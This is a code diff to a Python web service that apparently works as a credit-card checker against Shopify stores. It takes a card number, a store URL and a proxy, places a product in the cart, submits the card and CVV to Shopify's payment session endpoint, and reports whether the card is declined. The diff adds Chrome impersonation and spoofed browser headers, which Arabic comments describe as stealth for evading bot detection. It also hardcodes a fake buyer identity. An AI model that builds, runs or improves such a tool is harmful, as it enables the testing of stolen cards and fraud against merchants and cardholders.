@@ -1,15 +1,12 @@
 from fastapi import FastAPI, Query
 from fastapi.responses import JSONResponse
-import requests
+from curl_cffi import requests  # 🔥 مكتبة التخفي السحرية بديلة ريكويستس العادية
 import re
 import uuid
 import random
 import time
-import urllib3
 from html import unescape
 from urllib.parse import urlparse
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = FastAPI()
 
@@ -21,7 +18,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python Dynamic V25 (Master)"):
+def safe_response(msg, raw_data, price, gate="Python Dynamic V26 (The Ghost)"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg or "Empty" in msg or "Blocked" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -47,14 +44,24 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "5862156546"
         }
 
-        with requests.Session() as session:
+        # 🔥 تفعيل وضع التخفي (impersonate) لمحاكاة كروم 120 ببروتوكول HTTP/2
+        with requests.Session(impersonate="chrome120") as session:
             session.verify = False
             if proxies: session.proxies.update(proxies)
             
+            # الهيدرز البشرية المطابقة تماماً لمتصفح كروم
             session.headers.update({
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+                'Sec-Ch-Ua-Mobile': '?0',
+                'Sec-Ch-Ua-Platform': '"Windows"',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-User': '?1',
+                'Upgrade-Insecure-Requests': '1'
             })
 
             variant_id, price = None, "-"
@@ -81,7 +88,13 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if not variant_id: 
                 return JSONResponse(content=safe_response("Product Not Found", "No variants available", "-"))
 
-            session.headers.update({"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"})
+            session.headers.update({
+                "X-Requested-With": "XMLHttpRequest", 
+                "Accept": "application/json",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-origin"
+            })
             add_res = session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1})
             if add_res.status_code not in [200, 201]: 
                 return JSONResponse(content=safe_response("Cart Add Blocked", f"HTTP {add_res.status_code}", price))
@@ -89,7 +102,14 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             time.sleep(1.5)
 
             session.headers.pop("X-Requested-With", None)
-            session.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
+            session.headers.update({
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-User': '?1'
+            })
             
             res_chk = session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True)
             html_chk = res_chk.text
@@ -117,7 +137,14 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if not is_graphql: return JSONResponse(content=safe_response("Token Not Found", "Classic Token", price))
             if not checkout_token: checkout_token = "unknown"
 
-            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
+            pci_headers = {
+                "Origin": "https://checkout.pci.shopifyinc.com", 
+                "Content-Type": "application/json", 
+                "Accept": "application/json",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "cross-site"
+            }
             res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
             if res_pci.status_code != 200: res_pci = session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
             if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
@@ -134,7 +161,10 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
             gql_headers = {
                 'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
-                'x-checkout-web-source-id': checkout_token, 'x-checkout-one-session-token': session_token, 'Content-Type': 'application/json'
+                'x-checkout-web-source-id': checkout_token, 'x-checkout-one-session-token': session_token, 'Content-Type': 'application/json',
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-origin"
             }
             merch_id = str(uuid.uuid4())
             
@@ -198,10 +228,10 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             queue_token = data_obj.get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
             if not queue_token: return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:250], price))
             
-            # 🔥 الانتظار الذكي حتى انتهاء السيرفر من حساب الضرائب والشحن (PENDING_TERMS)
+            # 🔥 الانتظار الذكي (Double Tap)
             time.sleep(4.5)
             
-            # 🔥 الضربة الثانية: سحب الأرقام النهائية والمستقرة
+            # 🔥 الضربة الثانية
             res_prop2 = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
             res_prop_json2 = res_prop2.json()
             negotiate_res = res_prop_json2.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
